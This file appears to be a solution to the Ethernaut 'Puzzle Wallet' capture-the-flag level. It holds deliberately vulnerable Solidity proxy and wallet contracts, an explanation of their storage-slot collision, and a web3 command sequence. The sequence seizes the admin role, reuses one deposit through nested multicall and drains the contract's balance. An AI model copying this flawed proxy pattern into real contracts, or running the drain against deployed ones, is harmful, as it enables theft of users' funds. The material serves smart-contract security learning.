// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

/* EXPLANATION

The vulnerability here arises due to storage collision between the proxy contract (PuzzleProxy) and logic contract (PuzzleWallet). And storage collision is a nightmare when using delegatecall. Let's bring this nightmare to reality.

Note that in proxy pattern any call/transaction sent does not directly go to the logic contract (PuzzleWallet here), but it is actually delegated to logic contract inside proxy contract (PuzzleProxy here) through delegatecall method.

Since, delegatecall is context preserving, the context is taken from PuzzleProxy. Meaning, any state read or write in storage would happen in PuzzleProxy at a corresponding slot, instead of PuzzleWallet.

slot | PuzzleWallet  -  PuzzleProxy
----------------------------------
 0   |   owner      <-  pendingAdmin
 1   |   maxBalance <-  admin
 2   |           . 
 3   |           .

*/

// Reference - https://coder-question.com/cq-blog/525421

/* 

Steps to Complete the Challenge
1. functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}
1.a. params = [player]
1.b. data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
1.c. await web3.eth.sendTransaction({from: player, to: instance, data})
2. await contract.addToWhitelist(player)
3. depositData = await contract.methods["deposit()"].request().then(v => v.data)
4. multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
5. await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
6. await contract.execute(player, toWei('0.002'), 0x0)
7. await contract.setMaxBalance(player)
*/